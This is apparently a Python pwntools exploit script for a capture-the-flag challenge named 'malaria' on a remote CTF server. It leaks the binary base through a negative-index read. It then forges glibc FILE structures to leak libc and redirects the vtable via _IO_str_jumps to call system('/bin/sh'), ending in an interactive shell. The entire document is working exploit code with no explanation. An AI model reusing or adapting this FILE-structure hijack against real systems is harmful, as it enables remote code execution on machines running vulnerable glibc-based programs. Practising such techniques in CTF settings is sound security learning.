#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

LOCAL = False

if LOCAL: r = process('./malaria')
else: r = remote("pwn.game.alcapwnctf.in",42147)
libc = ELF("./docker/libc.so.6",False)
def cmd(x):
	r.recvuntil('>> ')
	r.sendline(str(x))

def new(i,l,s):
	cmd(1)
	r.recvuntil(':')
	r.sendline(str(i))
	r.recvuntil(':')
	r.sendline(str(int(l)))
	r.recvuntil(':')
	r.sendline(s)

def new1(i,l,s):
	cmd(1)
	r.recvuntil(':')
	r.sendline(str(i))
	r.recvuntil(':')
	r.sendline(str(int(l)))
	r.sendline(s)


def delete(i):
	cmd(3)
	r.recvuntil(':')
	r.sendline(str(i))

def show(i):
	cmd(2)
	r.recvuntil(':')
	r.sendline(str(i))


free_got = 0x201f70
bss = 0x202800

IO_file_jumps_offset = libc.symbols['_IO_file_jumps']
IO_str_jumps_offset = IO_file_jumps_offset + 0xc0


show(-7)
bin_base = u64(r.recvline()[1:-1].ljust(8,'\x00')) - 0x202008
print '[*] binary_base : ',hex(bin_base)

cmd(4)

# 0x74
s  = p64(0xfbad3887) # _flags
s += p64(0) # _IO_read_ptr
s += p64(0) # _IO_read_end
s += p64(0) # _IO_read_base
s += p64(bin_base + free_got) # _IO_write_base
s += p64(bin_base + free_got + 8) # _IO_write_ptr 
s += p64(0) # _IO_write_end
s += p64(bin_base + bss) # _IO_buf_base
s += p64(bin_base + bss) # _IO_buf_end
s = s.ljust(0x70,'\x00') #
s += p32(1)

new1(-4,0x228,s)
r.recvuntil('----------------\n')
r.recvuntil('----------------\n')

libc_base = u64((r.recvuntil('>>')[:-2].ljust(8,'\x00'))) - 0x80a30
libc.address  = libc_base
print '[*] libc_base : ',hex(libc_base)

IO_str_jumps = libc_base + IO_str_jumps_offset
print '[*] IO_str_jumps : ',hex(IO_str_jumps)

bin_sh = next(libc.search("/bin/sh\x00"))
r.sendline('4')

s1  = p64(0xfbad3886) # _flags
s1 += p64(0) # _IO_read_ptr
s1 += p64(0) # _IO_read_end
s1 += p64(0) # _IO_read_base
s1 += p64(bin_base + free_got) # _IO_write_base
s1 += p64(bin_base + free_got + 8) # _IO_write_ptr 
s1 += p64(0) # _IO_write_end
s1 += p64(bin_sh) # _IO_buf_base
s1 += p64(bin_sh) # _IO_buf_end
s1 = s1.ljust(0x70,'\x00') #
s1 += p64(1) # _fileno
s1 += p64(0) # _old_offset
s1 = s1.ljust(0x88,'\x00')
s1 += p64(bin_base + bss + 0x100) # _lock
s1 += p64(0) # _offset
s1 += p64(0)
s1 += p64(0) # wide_data
s1 = s1.ljust(0xd8,'\x00')
s1 += p64(IO_str_jumps - 0x28) # vtable #_IO_str_finish
s1 = s1.ljust(0xe8,'\x00')

s1 += p64(libc.symbols['system'])

new1(-4,0x228,s1)

# Shell

r.interactive()
